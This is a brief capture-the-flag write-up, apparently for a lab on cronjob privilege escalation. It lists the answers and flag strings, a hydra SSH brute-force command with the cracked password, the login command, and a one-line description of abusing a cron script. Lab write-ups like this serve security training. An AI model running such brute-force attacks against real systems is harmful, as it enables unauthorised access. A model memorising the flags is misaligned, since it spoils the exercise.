# Cronjob Privilage Escalation

1. What port is SSH running on?
   Ans:4567
   1. run a nmap scan and you will have the port number.

2. Crack sam's password and read flag1.txt
   Ans:`THM{dec4389bc09669650f3479334532aeab}`
   1. hydra -l sam -P ~/hack/wordlists/rockyou.txt 10.48.165.123 -s 4567 ssh: `chocolate`
   2. `ssh sam@10.48.165.123 -p 4567`

3. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
   Ans:`THM{b27d33705f97ba2e1f444ec2da5f5f61}`
   1. See another user ubuntu
   2. scripts folder has a cron job
   3. add command to cat falg2
